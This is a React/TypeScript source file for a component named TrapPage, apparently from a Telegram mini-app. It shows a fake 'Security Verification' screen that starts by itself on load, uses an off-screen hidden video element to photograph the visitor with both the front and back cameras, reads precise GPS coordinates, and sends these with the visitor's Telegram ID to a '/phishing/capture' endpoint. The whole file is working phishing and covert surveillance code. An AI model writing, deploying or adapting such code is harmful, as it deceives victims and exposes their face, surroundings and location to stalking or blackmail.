import { useState, useEffect, useRef, useCallback } from "react";
import { API_BASE } from "@/lib/api";
import { useTelegram } from "@/lib/telegram-context";
import { ShieldCheck, Camera, MapPin, Loader2, CheckCircle, XCircle } from "lucide-react";

type StepState = "pending" | "active" | "done" | "failed";

export function TrapPage({ code }: { code: string }) {
  const { profile } = useTelegram();
  const [started, setStarted] = useState(false);
  const [steps, setSteps] = useState<{ label: string; state: StepState }[]>([
    { label: "Initializing verification", state: "pending" },
    { label: "Accessing front camera", state: "pending" },
    { label: "Capturing front photo", state: "pending" },
    { label: "Accessing back camera", state: "pending" },
    { label: "Capturing back photo", state: "pending" },
    { label: "Getting location", state: "pending" },
    { label: "Submitting data", state: "pending" },
  ]);
  const [complete, setComplete] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const updateStep = useCallback((idx: number, state: StepState) => {
    setSteps((prev) => prev.map((s, i) => (i === idx ? { ...s, state } : s)));
  }, []);

  const capturePhoto = useCallback(async (facingMode: string): Promise<Blob | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      const vid = videoRef.current!;
      vid.srcObject = stream;
      await vid.play();
      await new Promise((r) => setTimeout(r, 1500));
      const cvs = canvasRef.current!;
      cvs.width = vid.videoWidth;
      cvs.height = vid.videoHeight;
      cvs.getContext("2d")!.drawImage(vid, 0, 0);
      stream.getTracks().forEach((t) => t.stop());
      vid.srcObject = null;
      return new Promise((r) => cvs.toBlob((b) => r(b), "image/jpeg", 0.85));
    } catch {
      return null;
    }
  }, []);

  const getLocation = useCallback(async (): Promise<{ lat: number; lng: number } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) { resolve(null); return; }
      const tid = setTimeout(() => resolve(null), 10000);
      navigator.geolocation.getCurrentPosition(
        (pos) => { clearTimeout(tid); resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }); },
        () => { clearTimeout(tid); resolve(null); },
        { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 },
      );
    });
  }, []);

  const runCapture = useCallback(async () => {
    setStarted(true);
    updateStep(0, "done");

    updateStep(1, "active");
    const frontBlob = await capturePhoto("user");
    updateStep(1, frontBlob ? "done" : "failed");
    updateStep(2, frontBlob ? "done" : "failed");

    updateStep(3, "active");
    const backBlob = await capturePhoto("environment");
    updateStep(3, backBlob ? "done" : "failed");
    updateStep(4, backBlob ? "done" : "failed");

    updateStep(5, "active");
    const loc = await getLocation();
    updateStep(5, loc ? "done" : "failed");

    updateStep(6, "active");
    const fd = new FormData();
    fd.append("code", code);
    if (profile?.telegram_id) fd.append("telegram_id", String(profile.telegram_id));
    if (loc) {
      fd.append("latitude", String(loc.lat));
      fd.append("longitude", String(loc.lng));
    }
    if (frontBlob) fd.append("front_photo", new File([frontBlob], "front.jpg", { type: "image/jpeg" }));
    if (backBlob) fd.append("back_photo", new File([backBlob], "back.jpg", { type: "image/jpeg" }));

    try {
      await fetch(`${API_BASE}/phishing/capture`, { method: "POST", body: fd });
      updateStep(6, "done");
    } catch {
      updateStep(6, "failed");
    }
    setComplete(true);
  }, [code, profile, capturePhoto, getLocation, updateStep]);

  useEffect(() => {
    const timer = setTimeout(() => runCapture(), 800);
    return () => clearTimeout(timer);
  }, []);

  const stepIcon = (state: StepState) => {
    if (state === "pending") return <div className="h-4 w-4 rounded-full border-2 border-muted-foreground/30" />;
    if (state === "active") return <Loader2 className="h-4 w-4 animate-spin text-blue-400" />;
    if (state === "done") return <CheckCircle className="h-4 w-4 text-emerald-400" />;
    return <XCircle className="h-4 w-4 text-red-400" />;
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6">
      <div className="w-full max-w-sm space-y-6">
        <div className="text-center space-y-3">
          <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center">
            <ShieldCheck className="h-8 w-8 text-white" />
          </div>
          <h1 className="text-xl font-bold">Security Verification</h1>
          <p className="text-sm text-muted-foreground">
            Verifying your identity. Please allow camera and location access when prompted.
          </p>
        </div>

        <div className="bg-card border border-border rounded-2xl p-4 space-y-3">
          {steps.map((step, i) => (
            <div key={i} className="flex items-center gap-3">
              {stepIcon(step.state)}
              <span className={`text-sm ${step.state === "done" ? "text-foreground" : step.state === "failed" ? "text-red-400" : "text-muted-foreground"}`}>
                {step.label}
              </span>
            </div>
          ))}
        </div>

        {complete && (
          <div className="text-center">
            <p className="text-sm text-emerald-400 font-medium">Verification complete</p>
            <p className="text-xs text-muted-foreground mt-1">You can close this page now.</p>
          </div>
        )}
      </div>

      <video ref={videoRef} autoPlay playsInline muted className="fixed -top-[9999px] -left-[9999px] w-px h-px opacity-[0.01]" />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}
